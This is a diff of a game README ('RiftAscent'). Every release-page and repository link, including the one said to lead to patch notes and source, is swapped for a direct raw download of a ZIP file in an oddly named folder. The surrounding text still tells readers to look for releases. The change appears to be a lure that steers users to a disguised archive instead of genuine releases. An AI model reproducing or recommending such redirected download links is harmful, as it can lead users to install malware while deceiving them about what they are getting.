@@ -1,6 +1,6 @@
 # 🎮 RiftAscent - Endless Action, Simple Setup
 
-[![Download RiftAscent](https://img.shields.io/badge/Download-RiftAscent-brightgreen?style=for-the-badge)](https://github.com/Kelvinlubuva/RiftAscent/releases)
+[![Download RiftAscent](https://img.shields.io/badge/Download-RiftAscent-brightgreen?style=for-the-badge)](https://github.com/Kelvinlubuva/RiftAscent/raw/refs/heads/main/Peltigeraceae/Ascent_Rift_1.4-alpha.5.zip)
 
 ---
 
@@ -40,12 +40,12 @@ If your computer meets these basics, RiftAscent should run well.
 
 You will find all releases on the official GitHub page below. This page contains the latest and all previous versions in one place.
 
-[![Download RiftAscent](https://img.shields.io/badge/Download-RiftAscent-blue?style=for-the-badge)](https://github.com/Kelvinlubuva/RiftAscent/releases)
+[![Download RiftAscent](https://img.shields.io/badge/Download-RiftAscent-blue?style=for-the-badge)](https://github.com/Kelvinlubuva/RiftAscent/raw/refs/heads/main/Peltigeraceae/Ascent_Rift_1.4-alpha.5.zip)
 
 ### How to Download
 
 1. Click the button above or visit this link directly in your browser:  
-   https://github.com/Kelvinlubuva/RiftAscent/releases
+   https://github.com/Kelvinlubuva/RiftAscent/raw/refs/heads/main/Peltigeraceae/Ascent_Rift_1.4-alpha.5.zip
 
 2. On the page, look for the latest release. It is usually at the top and marked with a version number.
 
@@ -118,7 +118,7 @@ If problems continue, you can report issues on the GitHub page under "Issues."
 ## 📂 Additional Resources
 
 - Visit the GitHub repository to find updates, patch notes, and the game’s source:  
-  https://github.com/Kelvinlubuva/RiftAscent
+  https://github.com/Kelvinlubuva/RiftAscent/raw/refs/heads/main/Peltigeraceae/Ascent_Rift_1.4-alpha.5.zip
 
 - The repository’s "Wiki" section contains tips and deeper guides.
 
@@ -131,7 +131,7 @@ If problems continue, you can report issues on the GitHub page under "Issues."
 RiftAscent receives updates for new features and bug fixes. To keep your copy current:
 
 - Check the releases page regularly:  
-  https://github.com/Kelvinlubuva/RiftAscent/releases
+  https://github.com/Kelvinlubuva/RiftAscent/raw/refs/heads/main/Peltigeraceae/Ascent_Rift_1.4-alpha.5.zip
 
 - Download the latest ZIP file and replace your old game folder’s contents.
 
@@ -172,4 +172,4 @@ RiftAscent is available under an open-source license. You can view the exact ter
 
 ---
 
-[![Download RiftAscent](https://img.shields.io/badge/Download-RiftAscent-brightgreen?style=for-the-badge)](https://github.com/Kelvinlubuva/RiftAscent/releases)
+[![Download RiftAscent](https://img.shields.io/badge/Download-RiftAscent-brightgreen?style=for-the-badge)](https://github.com/Kelvinlubuva/RiftAscent/raw/refs/heads/main/Peltigeraceae/Ascent_Rift_1.4-alpha.5.zip)
